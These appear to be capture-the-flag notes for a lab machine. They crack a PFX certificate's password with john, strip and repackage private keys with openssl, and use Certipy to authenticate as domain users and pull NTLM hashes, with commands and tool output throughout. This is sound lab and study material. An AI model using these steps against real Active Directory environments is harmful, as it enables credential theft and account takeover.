Password for baker.key: `newpassword`

```bash
$ ls -lash baker*
12K -rwx------ 1 gareth gareth 2.5K Jun 20 12:54 baker.crt
12K -rwx------ 1 gareth gareth 2.0K Jun 20 12:54 baker.key
```

Create an unencrypted version of `baker.key`  

```bash
openssl rsa -in baker.key -out baker-decrypted.key
```

Create a `pfx` file  to bundle the private key and the certificate into a single portable file:

```bash
openssl pkcs12 -export -out baker.pfx -inkey baker-decrypted.key -in baker.crt -passout pass:test123
```

Use Certipyv5.0.3 to retrieve users NTLMv1 hash:

```bash
certipy auth -pfx baker.pfx -dc-ip 10.129.231.92 -password test123
```



################

To create a `.crt` and `.key` from a `.pfx`.

Convert pfx file to hash

```bash
/usr/bin/pfx2john clark.pfx | tee clark.john
```

Run `john` to crack to get password

Extract the key:

```bash
openssl pkcs12 -in lewis.pfx -nocerts -out lewis.key -nodes
Enter Import Password: <Cracked Password>
```

Dump the certificate:

```bash
openssl pkcs12 -in lewis.pfx -clcerts -nokeys -out lewis.crt
Enter Import Password: <Cracked Password>
```

Repackage for Certipy:

```bash
openssl pkcs12 -export -out lewis_repackaged.pfx -inkey lewis.key -in lewis.crt -passout pass:test123
```

Run Certipy:

(It appears this account has been revoked)

```bash
certipy auth -pfx lewis_repackaged.pfx -dc-ip 10.129.231.92 -password test123
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'e.lewis@scepter.htb'
[*]     Security Extension SID: 'S-1-5-21-74879546-916818434-740295365-2101'
[*] Using principal: 'e.lewis@scepter.htb'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Use -debug to print a stacktrace
[-] See the wiki for more information
```